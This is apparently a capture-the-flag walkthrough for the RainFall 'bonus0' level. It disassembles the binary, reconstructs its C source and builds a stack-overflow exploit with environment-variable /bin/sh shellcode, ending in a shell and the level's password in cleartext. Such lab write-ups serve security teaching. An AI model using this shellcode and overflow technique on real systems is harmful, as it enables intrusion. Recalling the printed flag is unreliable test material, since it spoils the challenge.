## bonus0
Here is the objdump for the program
```
080484b4 <p>:
 80484b4:       55                      push   ebp
 80484b5:       89 e5                   mov    ebp,esp
 80484b7:       81 ec 18 10 00 00       sub    esp,0x1018
 80484bd:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484c0:       89 04 24                mov    DWORD PTR [esp],eax
 80484c3:       e8 e8 fe ff ff          call   80483b0 <puts@plt>
 80484c8:       c7 44 24 08 00 10 00    mov    DWORD PTR [esp+0x8],0x1000
 80484cf:       00
 80484d0:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484d6:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484da:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 80484e1:       e8 9a fe ff ff          call   8048380 <read@plt>
 80484e6:       c7 44 24 04 0a 00 00    mov    DWORD PTR [esp+0x4],0xa
 80484ed:       00
 80484ee:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 80484f4:       89 04 24                mov    DWORD PTR [esp],eax
 80484f7:       e8 d4 fe ff ff          call   80483d0 <strchr@plt>
 80484fc:       c6 00 00                mov    BYTE PTR [eax],0x0
 80484ff:       8d 85 f8 ef ff ff       lea    eax,[ebp-0x1008]
 8048505:       c7 44 24 08 14 00 00    mov    DWORD PTR [esp+0x8],0x14
 804850c:       00
 804850d:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048511:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048514:       89 04 24                mov    DWORD PTR [esp],eax
 8048517:       e8 d4 fe ff ff          call   80483f0 <strncpy@plt>
 804851c:       c9                      leave
 804851d:       c3                      ret

0804851e <pp>:
 804851e:       55                      push   ebp
 804851f:       89 e5                   mov    ebp,esp
 8048521:       57                      push   edi
 8048522:       53                      push   ebx
 8048523:       83 ec 50                sub    esp,0x50
 8048526:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 804852d:       08
 804852e:       8d 45 d0                lea    eax,[ebp-0x30]
 8048531:       89 04 24                mov    DWORD PTR [esp],eax
 8048534:       e8 7b ff ff ff          call   80484b4 <p>
 8048539:       c7 44 24 04 a0 86 04    mov    DWORD PTR [esp+0x4],0x80486a0
 8048540:       08
 8048541:       8d 45 e4                lea    eax,[ebp-0x1c]
 8048544:       89 04 24                mov    DWORD PTR [esp],eax
 8048547:       e8 68 ff ff ff          call   80484b4 <p>
 804854c:       8d 45 d0                lea    eax,[ebp-0x30]
 804854f:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048553:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048556:       89 04 24                mov    DWORD PTR [esp],eax
 8048559:       e8 42 fe ff ff          call   80483a0 <strcpy@plt>
 804855e:       bb a4 86 04 08          mov    ebx,0x80486a4
 8048563:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048566:       c7 45 c4 ff ff ff ff    mov    DWORD PTR [ebp-0x3c],0xffffffff
 804856d:       89 c2                   mov    edx,eax
 804856f:       b8 00 00 00 00          mov    eax,0x0
 8048574:       8b 4d c4                mov    ecx,DWORD PTR [ebp-0x3c]
 8048577:       89 d7                   mov    edi,edx
 8048579:       f2 ae                   repnz scas al,BYTE PTR es:[edi]
 804857b:       89 c8                   mov    eax,ecx
 804857d:       f7 d0                   not    eax
 804857f:       83 e8 01                sub    eax,0x1
 8048582:       03 45 08                add    eax,DWORD PTR [ebp+0x8]
 8048585:       0f b7 13                movzx  edx,WORD PTR [ebx]
 8048588:       66 89 10                mov    WORD PTR [eax],dx
 804858b:       8d 45 e4                lea    eax,[ebp-0x1c]
 804858e:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048592:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048595:       89 04 24                mov    DWORD PTR [esp],eax
 8048598:       e8 f3 fd ff ff          call   8048390 <strcat@plt>
 804859d:       83 c4 50                add    esp,0x50
 80485a0:       5b                      pop    ebx
 80485a1:       5f                      pop    edi
 80485a2:       5d                      pop    ebp
 80485a3:       c3                      ret

080485a4 <main>:
 80485a4:       55                      push   ebp
 80485a5:       89 e5                   mov    ebp,esp
 80485a7:       83 e4 f0                and    esp,0xfffffff0
 80485aa:       83 ec 40                sub    esp,0x40
 80485ad:       8d 44 24 16             lea    eax,[esp+0x16]
 80485b1:       89 04 24                mov    DWORD PTR [esp],eax
 80485b4:       e8 65 ff ff ff          call   804851e <pp>
 80485b9:       8d 44 24 16             lea    eax,[esp+0x16]
 80485bd:       89 04 24                mov    DWORD PTR [esp],eax
 80485c0:       e8 eb fd ff ff          call   80483b0 <puts@plt>
 80485c5:       b8 00 00 00 00          mov    eax,0x0
 80485ca:       c9                      leave
 80485cb:       c3                      ret
 80485cc:       90                      nop
 80485cd:       90                      nop
 80485ce:       90                      nop
 80485cf:       90                      nop
```

The source code can be deduced like so:
```clike=
#include <stdio.h>
#include <string.h>

// 080484b4 
void p(char* str1, char* str2)
{
    char p_buf[4104];
    char *newline;
    
    puts(str2);
    
    // 80484e1
    read(0, p_buf, 4096);
    
    // 80484f7
    newline = strchr(p_buf, '\n');
    
    // 80484fc
    *newline = 0;
    
    // 8048517
    strncpy(str1, p_buf, 20);
}

// 0804851e 
void pp(char *str)
{
    char ppbuf1[20];
    char ppbuf2[20];
    
    p(ppbuf1, " - ");
    p(ppbuf2, " - ");
    
    // 8048559
    strcpy(str, pp_buf1);
    
    // 8048579 
    str[strlen(str)] = 32;
    
    // 8048598
    strcat(str, ppbuf2);
    return ;
}

int main()
{
    char res[42];
    pp(res);
    puts(res);
    return 0;
}

```
On the surface, it looks like the `newline = strchr(p_buf, '\n');` line will break the program because the read might return string without newline, which will cause `strchr` not be able to place a nullbyte. **I am not sure what happens next, so we need to test.**

~~This may affect the `strcpy` call at `pp` later on to unintentionally copy other memory into the `str` variable, which may cause overflow since our `str` variable only allocates up to 42 bytes.~~

To test, I have set up the test environment command using fifo since the program needs to read two times from different streams. */tmp/input1* will contain the string for the first read() and */tmp/input2* will contain the string for the second read().

```
mkfifo /tmp/input1ff
mkfifo /tmp/input2ff

python -c "print 'B' * 4097" > /tmp/input1
python -c "print 'A' * 4097" > /tmp/input2

./bonus0 < /tmp/input1ff
cat /tmp/input1 - > /tmp/input1ff < /tmp/input2ff
cat /tmp/input2 > /tmp/input2ff
```


The following is taken after the first read() call, where you are able to see it started and ended at expected locations

![image](https://hackmd.io/_uploads/S1WrVlzL6.png)

As we approach the `strchr` part, we are not able to locate a `\n`, hence it returns 0x0 which will be derefrenced by the next instruction and causes a segfault. Hence, we will change our input files to be able to be searched by strchr. 

```
python -c "print 'B' * 12 + '\n'" > /tmp/input1
python -c "print 'A' * 12" > /tmp/input2
```

I also saw the manpage for strncmp and it says
> Warning: If there is no null byte among the first n bytes of src, the string placed in dest will not be null-terminated.

So Im expecting to see an unterminated string in `ppbuf1` at the end since the pointer found by `strchr` will be > 20 and strncmp only copies up to 20 bytes, excluding the nullbyte. The following is the layout of `ppbuf1` after the strncpy with a long input

![image](https://hackmd.io/_uploads/Byr1vxGIa.png)

Now lets try to have a valid input and verify the latter. As we can see, we have a nullbyte at the end, and we are able to express the value as a string.

![image](https://hackmd.io/_uploads/SyvVDxG8T.png)

Since the program is executing normally, I wanted to see the layout of memory before strcpy in pp occurs. Since we are able to make it so that `ppbuf1` does not have a nullbyte, I wonder where does the string ends in this case. As we can see, under normal circumstances, `ppbuf1` and `ppbuf2` are quite close to each other.
![image](https://hackmd.io/_uploads/H1qM3eG8a.png)

As we can see, we are quite close to the EIP that we can overwrite to change the return address, so lets try and figure out if there is a method we can do to reach there. Currently, the `ppbuf1` array is 52 bytes away to reach the saved EIP, however our max size we can get is 40 (ppbuf1 + ppbuf2) .

![image](https://hackmd.io/_uploads/rkd-0xMU6.png)

We can try to maximaize our current buffers, to observe the result using the inputs below

```
python -c "print 'B' * 25 + '\n'" > /tmp/input1
python -c "print 'A' * 19" > /tmp/input2
```

As we can see, we ended right above the ebp with the inputs maxed out
![image](https://hackmd.io/_uploads/Sk5Fk-z8a.png)

However, I do notice that we have a strcat afterwards, which add to **the buffer from the main** function ; `res`. This implies that instead of trying to overwrite to the saved EIP of the `pp()` function. Which as you can see, already has our EIP overwritten.

![image](https://hackmd.io/_uploads/SJZLHWGLp.png)

Looking at the information, looks like the saved EIP is located at `0xbffff72c`, which is mapped to the last 6th character of our second input, lets verfy that using the new input
```
python -c "print 'B' * 25 + '\n'" > /tmp/input1
python -c "print 'A' * 14 + 'BBBB' + 'A'" > /tmp/input2
```

And as you can see, we manage to find the offset to the saved EIP
![image](https://hackmd.io/_uploads/H12NP-G8a.png)


Now for the actual shellcode, I used the one I generated previously and export it as an environment variable because there is no complicated argv calculations needed
```
export SHELLCODE=`python -c "print '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'"`
```

I also get the address of the environment variable using a small program
```clike=
// getenv.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
         }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```

```
bonus0@RainFall:/tmp$ gcc getenv.c -o getenv && env -i PATH=$PATH SHELLCODE=$SHELLCODE ./getenv SHELLCODE ./bonus0
SHELLCODE will be at 0xbfffffd8
```

With the information, i will change the input and launch using the following 

```
mkfifo /tmp/input1ff
mkfifo /tmp/input2ff

python -c "print 'B' * 25 + '\n'" > /tmp/input1
python -c "print 'A' * 14 + '\xbf\xff\xff\xd8'[::-1] + 'A'" > /tmp/input2

env -i PATH=$PATH SHELLCODE=$SHELLCODE ./bonus0 < /tmp/input1ff
clear; cat /tmp/input1 - > /tmp/input1ff < /tmp/input2ff
clear; cat /tmp/input2 > /tmp/input2ff
```
Cant spawn the shell but got no errors, I try to combine the inputs together without FIFO since I dont need GDB anymore

```
bonus0@RainFall:~$ (cat /tmp/input1; cat /tmp/input2; cat) |  env -i PATH=$PATH SHELLCODE=$SHELLCODE ./bonus0
 -
 -
BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAA����A AAAAAAAAAAAAAA����A
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

our password is `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

